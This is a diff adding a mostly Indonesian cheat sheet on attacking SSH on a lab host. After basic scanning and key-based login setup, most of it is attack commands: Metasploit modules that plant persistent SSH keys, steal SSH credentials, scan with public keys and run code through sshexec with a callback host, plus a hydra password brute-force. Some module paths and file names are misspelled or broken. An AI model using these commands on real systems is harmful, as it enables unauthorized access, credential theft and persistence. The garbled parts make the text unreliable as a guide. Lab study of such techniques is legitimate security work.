@@ -1,0 +1,79 @@
+# SSH Port Scanning
+$ nmap -sV -p22 192.168.1.103
+
+## Methods to Connect SSH
+# password 123
+$ ssh ignite@192.168.1.103
+
+## Establish SSH connection using RSA key
+# jalankan perintah yang diberikan untuk menghasilkan pasangan kunci ssh (id_rsa dan id_rsa.pub) pada mesin host Ubuntu.
+$ ssh-keygen
+
+# Hal yang sama harus dilakukan pada mesin klien yang berwenang untuk membuat koneksi dengan mesin host (ubuntu).
+# Setelah pasangan kunci ssh (id_rsa dan id_rsa.pub) dihasilkan, ganti nama id_rsa.pub menjadi otor_keys seperti contoh
+$ ssh-keygen
+$ cd .ssh
+$ ls
+$ cat id_rsa.pub > otor_keys
+
+#  Bagikan otor_keys dengan mesin host dengan menyalinnya ke direktori .ssh.
+# Edit sshd_config dari dalam /etc/sshd menggunakan editor
+$ nano /etc/ssh/sshd_config
+
+# Aktifkan komentar “passwordAuthentication no”
+#  Salin kunci id_rsa dari Kali Linux ke mesin windows, untuk membuat koneksi menggunakan kunci resmi pada mesin windows,
+# Instal puttygen.exe
+# Jalankan puttygen.exe dan muat id_rsa dan “save as key” bernama Key
+# Gunakan putty.exe untuk terhubung dengan mesin host dengan memasukkan nama host 192.168.1.103 dan port 22.
+#  Arahkan ke SSH >auth dan telusuri kunci pribadi kunci yang telah Anda simpan seperti yang disebutkan di langkah 9.
+# Ini akan membuat koneksi ssh antara klien windows dan server tanpa menggunakan kata sandi.
+
+
+### Eksploitasi SSH dengan Metasploit
+
+## SSH Key Persistence- Post Exploitation
+
+$ use post/linux/manage/sshkey_persistence
+msf post(sshkey_persistence) > set session 1
+msf post(sshkey_persistence) >exploit
+# Di sini saya telah mengganti nama pribadi sebagai "key" dan memberikan izin 600.
+chmod 600 key
+ssh -i key ignite@192.168.1.103
+
+## Mencuri kunci SSH
+use post/multi/gather/ssh_creds
+msf post(ssh_creds) >set session 1
+msf post(ssh_creds) >exploit
+
+chmod 600 key
+ssh -i key ignite@192.168.1.103
+
+
+## SSH login using pubkey
+use auxillary/scanner/ssh /ssh_login_pubkey
+auxiliary (scanner/ssh /ssh_login_pubkey)>set rhosts 192.168.1.103
+auxiliary (scanner/ssh /ssh_login_pubkey)>set username ignite
+auxiliary (scanner/ssh /ssh_login_pubkey)>set key_path /root/.ssh/id_rsa
+auxiliary (scanner/ssh /ssh_login_pubkey)>exploit
+sessions -u 1
+
+
+###  SSH Password cracking
+$ hydra -L user.txt -P pass.txt 192.168.1.103 ssh
+
+
+### SSH Public Key Login Scanner
+msf > use auxiliary/scanner/ssh/ssh_login_pubkey
+msf auxiliary(ssh_login_pubkey) > set rhosts 192.168.1.103
+msf auxiliary(ssh_login_pubkey) > set user_file /root/user.txt
+msf auxiliary(ssh_login_pubkey) > set key_path /root/.ssh/id_rsa.pub
+msf auxiliary(ssh_login_pubkey) > run
+
+
+### SSH User Code Execution
+msf > use exploit/multi/ssh/sshexec
+msf exploit(sshexec) >set rhosts 192.168.1.103
+msf exploit(sshexec) >set username ignite
+msf exploit(sshexec) >set password 123
+msf exploit(sshexec) >set srvhost 192.168.1.107
+msf exploit(sshexec) >exploit
